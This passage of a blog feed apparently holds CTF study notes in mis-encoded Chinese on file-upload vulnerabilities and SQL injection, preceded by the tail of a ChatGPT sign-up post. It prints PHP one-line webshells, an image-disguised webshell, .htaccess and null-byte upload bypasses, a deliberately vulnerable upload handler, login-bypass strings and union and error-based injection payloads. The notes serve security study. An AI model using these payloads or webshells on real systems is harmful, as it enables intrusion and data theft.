src="/2023/02/07/ChatGPT%E5%9B%BD%E5%86%85%E8%AE%BF%E9%97%AE/5.jpg" class=""><p>çœ‹åˆ°çŸ­ä¿¡åç›´æ¥éªŒè¯å°±æå®šå•¦</p><p>å¯èƒ½æœ‰äººæ²¡æ”¶åˆ°çŸ­ä¿¡å¯ä»¥å‰æ‰æ‰‹æœºå·ç é‡æ–°ä¹°ä¸€ä¸ªï¼Œåªè¦æ²¡æœ‰å—åˆ°çŸ­ä¿¡20åˆ†é’Ÿå†…é€€æ‰ï¼Œä¼šæŠŠé’±é€€å›çš„</p><p>æ¥ä¸‹æ¥å°±æ˜¯å°½æƒ…ç©å•¦</p><img src="/2023/02/07/ChatGPT%E5%9B%BD%E5%86%85%E8%AE%BF%E9%97%AE/6.png" class=""><p>ä¹Ÿå¯ä»¥ç”¨<code>Microsoft Account</code>æˆ–è€…<code>Google</code>,ç”¨å“ªä¸ªæ³¨å†Œï¼Œä¸‹æ¬¡ç™»å½•çš„æ—¶å€™å°±è¦ç”¨å“ªç§æ–¹å¼ç™»å½•</p>]]></content>
    
    
    <categories>
      
      <category>å…¶ä»–å¥½ç©</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ChatGPT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ–‡ä»¶ä¸Šä¼ </title>
    <link href="/2023/02/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2023/02/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="åŸºç¡€"><a class="markdownIt-Anchor" href="#åŸºç¡€"></a> åŸºç¡€</h3><p>åœ¨ç½‘ç«™çš„è¿è¥è¿‡ç¨‹ä¸­ï¼Œä¸å¯é¿å…åœ°è¦å¯¹ç½‘ç«™çš„æŸäº›é¡µé¢æˆ–è€…å†…å®¹è¿›è¡Œæ›´æ–°ï¼Œè¿™æ—¶ä¾¿éœ€è¦ä½¿ç”¨åˆ°ç½‘ç«™çš„æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ã€‚å¦‚æœä¸å¯¹è¢«ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œé™åˆ¶æˆ–è€…é™åˆ¶è¢«ç»•è¿‡ï¼Œè¯¥åŠŸèƒ½ä¾¿æœ‰å¯èƒ½ä¼šè¢«åˆ©ç”¨äºä¸Šä¼ å¯æ‰§è¡Œæ–‡ä»¶ã€è„šæœ¬åˆ°æœåŠ¡å™¨ä¸Šï¼Œè¿›è€Œè¿›ä¸€æ­¥å¯¼è‡´æœåŠ¡å™¨æ²¦é™·ã€‚</p><p>æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯æŒ‡ç”¨æˆ·ä¸Šä¼ äº†ä¸€ä¸ªå¯æ‰§è¡Œè„šæœ¬æ–‡ä»¶ï¼Œå¹¶é€šè¿‡æ­¤æ–‡ä»¶è·å¾—äº†æ‰§è¡Œæœå™¨ç«¯å‘½ä»¤çš„èƒ½åŠ›ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸€èˆ¬æ˜¯æŒ‡ä¸Šä¼  WEB è„šæœ¬èƒ½å¤Ÿè¢«æœåŠ¡å™¨è§£æçš„é—®é¢˜ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„ webshell é—®é¢˜ã€‚å®Œæˆè¿™ä¸€æ”»å‡»éœ€è¦è¿™æ ·å‡ ä¸ªæ¡ä»¶ï¼Œä¸€æ˜¯ä¸Šä¼ çš„æ–‡ä»¶èƒ½å¤Ÿè¢« WEB å®¹å™¨æ‰§è¡Œï¼Œå…¶æ¬¡ç”¨æˆ·èƒ½ä» WEB ä¸Šè®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œæœ€åï¼Œå¦‚æœä¸Šä¼ çš„æ–‡ä»¶è¢«å®‰å…¨æ£€æŸ¥ã€æ ¼å¼åŒ–ã€å›¾ç‰‡å‹ç¼©ç­‰åŠŸèƒ½æ”¹å˜äº†å†…å®¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ”»å‡»å¤±è´¥ã€‚</p><p>PHPçš„æ–‡ä»¶ä¸Šä¼ é€šå¸¸ä½¿ç”¨move_uploaded_fileæ–¹æ³•é…åˆ$_FILESå˜é‡å®ç°ï¼Œå›¾ä¸­çš„ä»£ç ç›´æ¥ä½¿ç”¨äº†ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶åä½œä¸ºåç«¯ä¿å­˜çš„æ–‡ä»¶åï¼Œä¼šå¯¼è‡´ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="ä¸€å¥è¯æœ¨é©¬"><a class="markdownIt-Anchor" href="#ä¸€å¥è¯æœ¨é©¬"></a> ä¸€å¥è¯æœ¨é©¬</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">GI89a#å›¾ç‰‡å¹»æœ¯å¤´<br>&lt;script language=&#x27;php&#x27;&gt;eval($_POST[&#x27;shell&#x27;]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><h3 id="ç»•è¿‡ä¸Šä¼ æ£€æŸ¥"><a class="markdownIt-Anchor" href="#ç»•è¿‡ä¸Šä¼ æ£€æŸ¥"></a> ç»•è¿‡ä¸Šä¼ æ£€æŸ¥</h3><h4 id="å‰ç«¯æ£€æŸ¥æ‰©å±•å"><a class="markdownIt-Anchor" href="#å‰ç«¯æ£€æŸ¥æ‰©å±•å"></a> å‰ç«¯æ£€æŸ¥æ‰©å±•å</h4><p>æŠ“åŒ…ä¿®æ”¹åç¼€ç»•è¿‡å³å¯ï¼Œå¯ç”¨åç¼€å<code>php,php5,php4,php3,php2,html,htm,phtml</code></p><h4 id="æ–‡ä»¶ç±»å‹æ£€æŸ¥"><a class="markdownIt-Anchor" href="#æ–‡ä»¶ç±»å‹æ£€æŸ¥"></a> æ–‡ä»¶ç±»å‹æ£€æŸ¥</h4><p>æŠ“åŒ…ä¿®æ”¹ <code>Content-Type</code> ç±»å‹ï¼Œä½¿å…¶ç¬¦åˆç™½åå•è§„åˆ™ã€‚</p><p><code>Content-type=&quot;image/jpeg&quot;||&quot;image/png&quot;||&quot;image/gif&quot;</code></p><h4 id="ä¸Šä¼ æ–‡ä»¶é‡å‘½å"><a class="markdownIt-Anchor" href="#ä¸Šä¼ æ–‡ä»¶é‡å‘½å"></a> ä¸Šä¼ æ–‡ä»¶é‡å‘½å</h4><p>é€šå¸¸æ˜¯é€šè¿‡ä¿®æ”¹æ–‡ä»¶åç¼€æ¥ç»•è¿‡é»‘åå•</p><p>PHPå¸¸è§çš„å¯æ‰§è¡Œåç¼€ä¸ºphp3ã€php5ã€phtmlã€phtç­‰</p><p>æœåŠ¡å™¨ä¸ºwindowsç³»ç»Ÿå¯ä»¥å°è¯•&quot;php&quot; ã€ â€œphp ï¼š ï¼š$DATAâ€ã€&quot;php.&quot;ç­‰åç¼€ï¼›æ–‡ä»¶åä¸åŒºåˆ†å¤§å°å†™ï¼Œä½†è€Œin_arrayåŒºåˆ†å¤§å°å†™ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•å¤§å°å†™åç¼€åç»•è¿‡é»‘åå•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$name</span>=<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$ext</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&#x27;.&#x27;</span>),<span class="hljs-number">1</span>);<br><span class="hljs-variable">$dir</span>=<span class="hljs-string">&#x27;upload/&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;asp&#x27;</span>,<span class="hljs-string">&#x27;jsp&#x27;</span>)))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Forbid!&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$saveName</span>=<span class="hljs-variable">$dir</span>.<span class="hljs-title function_ invoke__">time</span>().<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$ext</span>;<br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$saveName</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="htaccessæ–‡ä»¶é‡å†™è§„åˆ™"><a class="markdownIt-Anchor" href="#htaccessæ–‡ä»¶é‡å†™è§„åˆ™"></a> .htaccessæ–‡ä»¶é‡å†™è§„åˆ™</h4><p>.htaccessæ˜¯Apacheåˆ†å¸ƒå¼é…ç½®æ–‡ä»¶çš„é»˜è®¤åç§°ï¼Œä¹Ÿå¯ä»¥åœ¨Apacheä¸»é…ç½®æ–‡ä»¶ä¸­é€šè¿‡AccessFileNameæŒ‡ä»¤ä¿®æ”¹åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶çš„åç§°ã€‚Apacheä¸»é…ç½®æ–‡ä»¶ä¸­é€šè¿‡AllowOverrideæŒ‡ä»¤é…ç½®.htaccessæ–‡ä»¶ä¸­å¯ä»¥ è¦† ç›– ä¸» é… ç½® æ–‡ ä»¶ çš„ é‚£ äº› æŒ‡ ä»¤ ï¼Œ åœ¨ ä½ äº 2.3.8 çš„ ç‰ˆ æœ¬ ä¸­ï¼ŒAllowOverrideæŒ‡ä»¤é»˜è®¤ä¸ºAllï¼Œåœ¨2.3.9åŠæ›´é«˜ç‰ˆæœ¬ä¸­é»˜è®¤ä¸ºNoneï¼Œå³åœ¨é«˜ç‰ˆæœ¬Apacheä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹.htaccesså·²æ— ä»»ä½•ä½œç”¨ã€‚ä¸è¿‡å³ä½¿AllowOverrideä¸ºAllï¼Œä¸ºäº†é¿å…å®‰å…¨é—®é¢˜ï¼Œä¹Ÿä¸èƒ½è¦†ç›–æ‰€æœ‰ä¸»é…ç½®æ–‡ä»¶ ä¸­ çš„ æŒ‡ ä»¤ ï¼Œ å…· ä½“ å¯ è¦† ç›– æŒ‡ ä»¤ å¯ æŸ¥ çœ‹ ï¼š<a href="http://httpd.apache.org/docs/2.2/mod/directive-dict.html#Context%E3%80%82%E5%9C%A8%E4%BD%8E%E4%BA%8E2.3.8%E7%89%88%E6%9C%AC%E6%97%B6%EF%BC%8C%E5%9B%A0%E4%B8%BA%E9%BB%98%E8%AE%A4AllowOverride%E4%B8%BAall%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%B0%9D%E8%AF%95%E4%B8%8A%E4%BC%A0.htaccess%E6%96%87%E4%BB%B6%E4%BF%AE%E6%94%B9%E9%83%A8%E5%88%86%E9%85%8D%E7%BD%AE%EF%BC%8C%E4%BD%BF%E7%94%A8SetHandler%E6%8C%87%E4%BB%A4%E4%BD%BFphp%E8%A7%A3%E6%9E%90%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6">http://httpd.apache.org/docs/2.2/mod/directive-dict.html#Contextã€‚åœ¨ä½äº2.3.8ç‰ˆæœ¬æ—¶ï¼Œå› ä¸ºé»˜è®¤AllowOverrideä¸ºallï¼Œå¯ä»¥å°è¯•ä¸Šä¼ .htaccessæ–‡ä»¶ä¿®æ”¹éƒ¨åˆ†é…ç½®ï¼Œä½¿ç”¨SetHandleræŒ‡ä»¤ä½¿phpè§£ææŒ‡å®šæ–‡ä»¶</a></p><p>è¯¥æ–¹æ³•åªé€‚ç”¨äºapacheæœåŠ¡å™¨å½“åªå…è®¸ä¸Šä¼ å›¾ç‰‡æ—¶ï¼Œåˆ©ç”¨.htaccessé‡å†™æ–‡ä»¶è§„åˆ™ï¼Œä½¿æœåŠ¡å™¨å°†å›¾ç‰‡å½“æˆphpæ–‡ä»¶è§£æ</p><p>è¿™æ—¶åªè¦ä¸Šä¼ å›¾ç‰‡æœ¨é©¬å°±å¯ä»¥èšå‰‘è¿æ¥äº†</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs applescript">.htaccess<br>GIF89a<br>&lt;FilesMatch <span class="hljs-string">&quot;htmleval&quot;</span>&gt;<br>SetHandler <span class="hljs-built_in">application</span>/x-httpd-php<br>&lt;/FilesMatch&gt;<br><br>å½“ä¸Šé¢æŠ¥é”™æ—¶ï¼Œç›´æ¥ç”¨ä¸‹é¢è¿™ä¸€å¥å°è¯•<br>SetHandler <span class="hljs-built_in">application</span>/x-httpd-php<br></code></pre></td></tr></table></figure><h4 id="ä¸Šä¼ useriniæ–‡ä»¶ç»•è¿‡é»‘åå•"><a class="markdownIt-Anchor" href="#ä¸Šä¼ useriniæ–‡ä»¶ç»•è¿‡é»‘åå•"></a> ä¸Šä¼ .user.iniæ–‡ä»¶ç»•è¿‡é»‘åå•</h4><h4 id="æœåŠ¡ç«¯æ·»åŠ åç¼€"><a class="markdownIt-Anchor" href="#æœåŠ¡ç«¯æ·»åŠ åç¼€"></a> æœåŠ¡ç«¯æ·»åŠ åç¼€</h4><p>åç«¯å…ˆè·å–ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶åï¼Œå†æ ¹æ®æ–‡ä»¶åè·å¾—æ–‡ä»¶çš„å®é™…åç¼€ï¼Œé€šè¿‡åç¼€çš„ç™½åå•æ ¡éªŒåï¼Œæœ€ç»ˆå†ä¿å­˜æ–‡ä»¶</p><p>è¿™ç§æƒ…å†µå¯ä»¥å°è¯•ç”¨<code>%00</code>æˆªæ–­ï¼šå¦‚<code>x.php\00.jpg</code>æˆªæ–­åä¸º<code>x.php</code></p><p>ä½†æ–‡ä»¶å­˜å‚¨çš„è·¯å¾„ä¸€éƒ¨åˆ†å¯æ§æ—¶ï¼Œä¹Ÿå¯ä»¥ç”¨%00æˆªæ–­ç»•è¿‡ï¼Œå¦‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br></code></pre></td></tr></table></figure><p>save_pathåŠ ä¸Š%00æˆªæ–­ååé¢éšæœºçš„åç§°å°†è¢«æˆªæ–­ï¼Œæˆ‘ä»¬å°†å¯ä»¥æ§åˆ¶å­˜å‚¨çš„è·¯å¾„ï¼Œsave_path=upload/1.php%00</p><p>æ³¨ï¼šå½“urlä¸­çš„å‚æ•°æ˜¯é€šè¿‡GETæ–¹å¼è·å–æ—¶ï¼Œ%00ä¼šè¢«è‡ªåŠ¨è§£ç ã€‚è€Œå½“å‚æ•°æ˜¯é€šè¿‡POSTæ–¹å¼è·å–æ—¶ï¼Œæ˜¯ä¸ä¼šè‡ªåŠ¨è§£ç çš„ï¼Œä¹Ÿå°±æ˜¯è¯´%00åªä¼šåŸæ ·è¢«å½“æˆå­—ç¬¦ä¸²æ¥è¾“å‡ºã€‚æ‰€ä»¥é€šè¿‡POSTæ–¹å¼è¯·æ±‚æ­¤ç±»å‚æ•°çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨å°†å®ƒçš„åå…­è¿›åˆ¶æ”¹å†™ä¸º0x00ã€‚</p><p>ä½†æ˜¯ï¼Œä½¿ç”¨<code>$_FILES['name']</code>æ˜¯<code>%00</code>æˆªæ–­æ— æ•ˆï¼Œå› ä¸ºPHPåœ¨ æ³¨ å†Œ $_FILES å…¨ å±€ å˜ é‡ æ—¶ å·² ç» äº§ ç”Ÿ äº† æˆª æ–­ ã€‚è€Œæ³¨å†Œåˆ°$_FILES[â€˜nameâ€™]çš„å˜é‡å€¼ä¸ºx.phpã€‚</p><h4 id="æœåŠ¡ç«¯æ‰©å±•åæ£€æµ‹"><a class="markdownIt-Anchor" href="#æœåŠ¡ç«¯æ‰©å±•åæ£€æµ‹"></a> æœåŠ¡ç«¯æ‰©å±•åæ£€æµ‹</h4><p>åˆ©ç”¨è§£ææ¼æ´</p><h5 id="apache-è§£æ"><a class="markdownIt-Anchor" href="#apache-è§£æ"></a> Apache è§£æ</h5><p>Apache å¯¹åç¼€è§£ææ˜¯ä»å³å‘å·¦çš„</p><p><code>phpshell.php.rar.rar.rar.rar</code> å› ä¸º Apache ä¸è®¤è¯† <code>.rar</code> è¿™ä¸ªæ–‡ä»¶ç±»å‹ï¼Œæ‰€ä»¥ä¼šä¸€ç›´éå†åç¼€åˆ° <code>.php</code>ï¼Œç„¶åè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ª PHP æ–‡ä»¶ã€‚</p><p>â€‹</p><h3 id="å‚è€ƒèµ„æ–™"><a class="markdownIt-Anchor" href="#å‚è€ƒèµ„æ–™"></a> <em>å‚è€ƒèµ„æ–™</em></h3><p><em><a href="https://ctf-wiki.org/web/php/php/#_4">https://ctf-wiki.org/web/php/php/#_4</a></em></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLæ³¨å…¥</title>
    <link href="/2023/01/31/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/01/31/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="åŸºç¡€"><a class="markdownIt-Anchor" href="#åŸºç¡€"></a> åŸºç¡€</h2><ul><li>SQL æ³¨å…¥æ˜¯ä¸€ç§å°† SQL ä»£ç æ’å…¥æˆ–æ·»åŠ åˆ°åº”ç”¨ï¼ˆç”¨æˆ·ï¼‰çš„è¾“å…¥å‚æ•°ä¸­ï¼Œä¹‹åå†å°†è¿™äº›å‚æ•°ä¼ é€’ç»™åå°çš„ SQL æœåŠ¡å™¨åŠ ä»¥è§£æå¹¶æ‰§è¡Œçš„æ”»å‡»ã€‚</li><li>æ”»å‡»è€…èƒ½å¤Ÿä¿®æ”¹ SQL è¯­å¥ï¼Œè¯¥è¿›ç¨‹å°†ä¸æ‰§è¡Œå‘½ä»¤çš„ç»„ä»¶ï¼ˆå¦‚æ•°æ®åº“æœåŠ¡å™¨ã€åº”ç”¨æœåŠ¡å™¨æˆ– WEB æœåŠ¡å™¨ï¼‰æ‹¥æœ‰ç›¸åŒçš„æƒé™ã€‚</li><li>å¦‚æœ WEB åº”ç”¨å¼€å‘äººå‘˜æ— æ³•ç¡®ä¿åœ¨å°†ä» WEB è¡¨å•ã€cookieã€è¾“å…¥å‚æ•°ç­‰æ”¶åˆ°çš„å€¼ä¼ é€’ç»™ SQL æŸ¥è¯¢ï¼ˆè¯¥æŸ¥è¯¢åœ¨æ•°æ®åº“æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼‰ä¹‹å‰å·²ç»å¯¹å…¶è¿›è¡Œè¿‡éªŒè¯ï¼Œé€šå¸¸å°±ä¼šå‡ºç° SQL æ³¨å…¥æ¼æ´ã€‚</li></ul><h3 id="mysqlæ•°æ®åº“"><a class="markdownIt-Anchor" href="#mysqlæ•°æ®åº“"></a> mysqlæ•°æ®åº“</h3><p>cmdè¿æ¥æ•°æ®åº“ï¼š</p><ol><li>é…ç½®å¥½ç¯å¢ƒå˜é‡</li><li>ç™»å½•ï¼šmysql -uç”¨æˆ·å â€“p</li></ol><p>å‡ ä¸ªå¸¸ç”¨å‘½ä»¤ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">å±•ç¤ºæ•°æ®åº“ä¸­åŒ…å«çš„å…¨éƒ¨åº“ï¼š<span class="hljs-keyword">show</span> databases;<br>å±•ç¤ºåº“ä¸­çš„æ‰€æœ‰è¡¨ï¼š<span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<br>å±•ç¤ºè¡¨çš„å­—æ®µç»“æ„ï¼š<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> è¡¨å;  æˆ–è€…ï¼š<span class="hljs-keyword">desc</span> è¡¨å;<br>æŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼š<span class="hljs-keyword">select</span> åˆ—å<span class="hljs-number">1</span>,åˆ—å<span class="hljs-number">2</span>,åˆ—å<span class="hljs-number">3</span>â€¦â€¦. <span class="hljs-keyword">from</span> è¡¨å <br></code></pre></td></tr></table></figure><p>æ•°æ®åº“ç»“æ„ï¼šåº“-&gt;è¡¨-&gt;åˆ—-&gt;è¡Œ</p><img src="/2023/01/31/SQL%E6%B3%A8%E5%85%A5/1.jpg" class=""><h3 id="sqlæ³¨å…¥ç‚¹æŒ–æ˜"><a class="markdownIt-Anchor" href="#sqlæ³¨å…¥ç‚¹æŒ–æ˜"></a> SQLæ³¨å…¥ç‚¹æŒ–æ˜</h3><p>ç™»å½•ç•Œé¢æˆ–è€…æŸ¥è¯¢æ¡†å…ˆå°è¯•ä¸‡èƒ½å¯†ç ï¼š aâ€™ or â€˜1â€™=â€™1æˆ–è€… adminâ€™-- (æ³¨é‡Šç¬¦) æˆ–è€…â€˜^0# æˆ–è€…*,1</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs livescript">æœ‰å›æ˜¾<br>è”åˆæŸ¥è¯¢ -&gt;æ„é€ è”åˆæŸ¥è¯¢è¯­å¥  <br>æŠ¥é”™æ³¨å…¥ -&gt;æ„é€ æŠ¥é”™è¯­å¥<br>å †æŸ¥è¯¢   -&gt;å¤šè¡Œè¯­å¥æ‰§è¡Œ<br><br>æ— å›æ˜¾        <br>ç›²æ³¨   -&gt;å¸ƒå°”å‹/æ—¶é—´å‹ é€šè¿‡æŸç§æ‰‹æ®µâ€œçˆ†ç ´â€ç»“æœ<br><br>æ•´å½¢æ³¨å…¥ï¼š<br>å½“è¾“å…¥çš„å‚æ•°ä¸ºæ•´å½¢æ—¶ï¼Œå¦‚æœå­˜åœ¨æ³¨å…¥æ¼æ´ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯æ•°å­—å‹æ³¨å…¥ã€‚<br>æµ‹è¯•æ–¹æ³•ï¼š(<span class="hljs-number">1</span>)åŠ å¼•å·æŠ¥é”™ï¼ˆå•å¼•å·æ²¡æŠ¥é”™çš„è¯ï¼Œå°è¯•åŒå¼•å·ï¼‰ï¼ˆ<span class="hljs-number">2</span>ï¼‰åŠ æ³¨é‡Šç¬¦è¿˜æ˜¯æŠ¥é”™<br><br>å­—ç¬¦å‹æ³¨å…¥:(å•å¼•å·æ²¡æŠ¥é”™å°è¯•åŒå¼•å·)<br>www.xxx.com/ccc.php?id=<span class="hljs-number">1</span>â€™ <span class="hljs-keyword">and</span> â€˜<span class="hljs-number">1</span>â€™=<span class="hljs-string">&#x27;1</span><br><span class="hljs-string">é¡µé¢æ­£å¸¸ï¼Œç»§ç»­ä¸‹ä¸€æ­¥</span><br><span class="hljs-string">www.xxx.com/ccc.php?id=1â€™ and â€˜1â€™=&#x27;</span><span class="hljs-number">2</span><br>é¡µé¢æŠ¥é”™ï¼Œåˆ™è¯´æ˜å­˜åœ¨å­—ç¬¦å‹æ³¨å…¥ã€‚<br><br><br><span class="hljs-comment">## è¢«è¿‡æ»¤æ—¶å¯ä»¥ç”¨fuzzæµ‹è¯•è¿‡æ»¤å†…å®¹</span><br></code></pre></td></tr></table></figure><h3 id="è”åˆæ³¨å…¥"><a class="markdownIt-Anchor" href="#è”åˆæ³¨å…¥"></a> è”åˆæ³¨å…¥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">payload:<br>1.åˆ¤æ–­æ•°å­—å‹æ³¨å…¥è¿˜æ˜¯å­—ç¬¦å‹æ³¨å…¥ <br>2.æµ‹è¯•å­—æ®µä¸ªæ•° <br>1&#x27; order by 3 #;  ï¼ˆå›æ˜¾æ­£å¸¸ï¼‰å³æ‰§è¡Œï¼š SELECT id,user,password FROM sql_bug WHERE id = &#x27; 1 &#x27; order by 3 #&#x27; limit 1<br>1&#x27; order by 4 #;  ï¼ˆå›æ˜¾é”™è¯¯ï¼‰å³æ‰§è¡Œï¼š SELECT id,user,password FROM sql_bug WHERE id = &#x27; 1 &#x27; order by 4 #&#x27; limit 1<br>3.çˆ†å‡ºåº“å union select 1,2,database() #<br>4.çˆ†å‡ºè¡¨å <br>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() # <br>5.çˆ†å‡ºå­—æ®µå <br>union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=â€™â€™ # <br>6.æŸ¥è¯¢æœ€ç»ˆçš„æ•°æ® union select group_concat(å­—æ®µå)from è¡¨å<br></code></pre></td></tr></table></figure><h3 id="æŠ¥é”™å‹æ³¨å…¥"><a class="markdownIt-Anchor" href="#æŠ¥é”™å‹æ³¨å…¥"></a> æŠ¥é”™å‹æ³¨å…¥</h3><p>ï¼ˆä¸€èˆ¬åœ¨æ²¡æ³•ç”¨è”åˆæŸ¥è¯¢æ—¶æ‰ç”¨ï¼‰</p><h4 id="extractvauleæŠ¥é”™"><a class="markdownIt-Anchor" href="#extractvauleæŠ¥é”™"></a> ExtractVauleæŠ¥é”™</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less">æ­£ç¡®å½¢å¼ï¼š<span class="hljs-selector-tag">extractvalue</span>(XML_document,Xpath_string)<br>æŠ¥é”™æ³¨å…¥ï¼š <span class="hljs-selector-tag">and</span> <span class="hljs-selector-tag">extractvalue</span>(<span class="hljs-number">1</span>,payload) <br>ä¾‹ï¼š<span class="hljs-selector-tag">and</span> <span class="hljs-selector-tag">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(select <span class="hljs-variable">@@version</span>),<span class="hljs-number">0</span>x7e))     <span class="hljs-comment">//è‡³äºæ˜¯andè¿˜æ˜¯orï¼Œéœ€è¦è®©è¿™ä¸ªæŠ¥é”™è¯­å¥èƒ½å¤Ÿè¢«æ‰§è¡Œ</span><br><span class="hljs-selector-tag">extractvalue</span>å‡½æ•°æ¯ä¸€æ¬¡åªèƒ½æ˜¾ç¤º<span 